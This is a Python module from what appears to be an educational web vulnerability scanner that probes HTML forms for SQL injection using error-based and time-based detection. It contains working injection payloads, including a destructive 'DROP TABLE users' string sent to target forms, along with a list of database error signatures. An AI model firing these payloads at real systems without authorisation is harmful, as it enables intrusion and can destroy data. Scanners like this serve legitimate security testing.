"""
Module: sqli.py
OWASP  : A03:2021 – Injection
Purpose: Test HTML forms for SQL injection vulnerabilities using
         error-based and time-based detection.
"""

import requests
import time

HEADERS = {"User-Agent": "WebVulnScanner/1.0 (Educational Pentest Tool)"}

# ── SQL Injection Payloads ──────────────────────────────────────────────
# These are classic payloads that trigger SQL errors or boolean behavior

ERROR_PAYLOADS = [
    "'",                          # Single quote — triggers syntax error
    "\"",                         # Double quote
    "' OR '1'='1",               # Always-true condition
    "' OR '1'='1' --",           # Comment-terminated injection
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' AND 1=2--",               # Always-false (blind detection)
    "'; DROP TABLE users--",     # Destructive payload (for detection only)
    "1' ORDER BY 1--",           # ORDER BY probe
    "1 UNION SELECT NULL--",     # UNION-based
]

# Time-based payloads — detect blind SQLi by measuring response time
TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:3'--",        # MSSQL
    "' OR SLEEP(3)--",                    # MySQL
    "'; SELECT pg_sleep(3)--",            # PostgreSQL
]

# SQL error patterns in response body
ERROR_SIGNATURES = [
    "you have an error in your sql",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "mysql_fetch",
    "mysql_num_rows",
    "ora-01756",
    "microsoft ole db provider for sql",
    "sqlite_step",
    "pg_query",
    "pdo::query",
    "jdbc.odbc",
    "sqlstate",
    "sql command not properly ended",
]


def submit_form(form, data, timeout=5):
    """Submit a form with given data dict."""
    try:
        if form["method"] == "post":
            return requests.post(form["action"], data=data,
                                 headers=HEADERS, timeout=timeout, verify=False)
        else:
            return requests.get(form["action"],  params=data,
                                headers=HEADERS, timeout=timeout, verify=False)
    except Exception:
        return None


def is_sql_error(response_text):
    """Check if response contains SQL error signatures."""
    text = response_text.lower()
    return any(sig in text for sig in ERROR_SIGNATURES)


def test_sql_injection(forms, timeout=5):
    """
    Test each form field with SQL payloads.
    Returns list of vulnerability dicts.
    """
    vulnerabilities = []

    for form in forms:
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "button", "image", "reset"):
                continue

            param_name = inp["name"]

            # ── Error-based detection ──
            for payload in ERROR_PAYLOADS:
                data = {}
                for i in form["inputs"]:
                    data[i["name"]] = i["value"] or "test"
                data[param_name] = payload

                resp = submit_form(form, data, timeout)
                if resp and is_sql_error(resp.text):
                    vulnerabilities.append({
                        "url":     form["action"],
                        "param":   param_name,
                        "payload": payload,
                        "type":    "Error-based",
                        "detail":  (
                            f"SQL error triggered in parameter '{param_name}' "
                            f"with payload: {payload[:40]}"
                        )
                    })
                    break  # One finding per param is enough

            # ── Time-based blind detection ──
            for payload in TIME_PAYLOADS:
                data = {}
                for i in form["inputs"]:
                    data[i["name"]] = i["value"] or "test"
                data[param_name] = payload

                start = time.time()
                resp = submit_form(form, data, timeout=timeout + 4)
                elapsed = time.time() - start

                # If response took 3+ seconds, it's likely a blind SQLi hit
                if elapsed >= 2.8:
                    vulnerabilities.append({
                        "url":     form["action"],
                        "param":   param_name,
                        "payload": payload,
                        "type":    "Time-based Blind",
                        "detail":  (
                            f"Time-based SQL injection in '{param_name}' — "
                            f"response delayed {elapsed:.1f}s with payload: {payload[:40]}"
                        )
                    })
                    break

    return vulnerabilities
